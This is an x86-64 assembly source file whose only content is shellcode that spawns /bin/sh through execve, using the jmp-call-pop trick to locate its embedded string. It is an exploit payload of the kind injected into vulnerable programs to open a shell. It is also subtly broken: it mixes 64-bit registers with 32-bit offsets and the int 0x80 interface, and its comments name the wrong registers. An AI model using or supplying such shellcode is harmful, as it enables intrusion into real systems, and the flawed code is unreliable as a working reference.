global _start

section .text
_start:

    jmp short two     ; Jump down to the bottom for the call trick.
one:
    ; int execve(const char *filename, char *const argv [], char *const envp[])
    pop rbx           ; Ebx has the addr of the string.
    xor rax, rax      ; Put 0 into rax.
    mov [rbx+7], al   ; Null terminate the /bin/sh string.
    mov [rbx+8], rbx  ; Put addr from rbx where the AAAA is.
    mov [rbx+12], rax ; Put 32-bit null terminator where the BBBB is.
    lea rcx, [rbx+8]  ; Load the address of [rbx+8] into ecx for argv ptr.
    lea rdx, [rbx+12] ; Edx = rbx + 12, which is the envp ptr.
    mov al, 11        ; Syscall #11
    int 0x80          ; Do it.

two:
    call one          ; Use a call to get string address.
    db '/bin/shXAAAABBBB'     ; The XAAAABBBB bytes aren't needed.
